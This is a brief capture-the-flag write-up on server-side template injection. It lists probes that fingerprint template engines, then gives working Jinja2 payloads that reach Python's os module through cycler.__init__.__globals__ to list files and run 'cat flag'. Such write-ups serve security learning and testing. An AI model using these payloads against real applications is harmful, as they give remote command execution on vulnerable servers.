Server Side Template Injection

Test
```
{{6 * 7}}               -> Jinja2 (Python Flask/Django) or Twig (PHP Symfony)
${6 * 7}                -> Freemarker (Java) or Thymeleaf (Java)
#set($a = 6 * 7)${a}    -> Velocity (Java)
{$7*7}                  -> Smarty (PHP)
<% print 7*7 %>         -> Mako (Python)
```

Find out its Jinja2 or Twig. Continue testing with `self` shows that it is python. 

Test
```jinja
{{self._TemplateReference__context.cycler.__init__.__globals__.os.listdir()}}
```

Shows files, one of them is `flag`. 

Test
```
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read()}}
```

Gives flag. 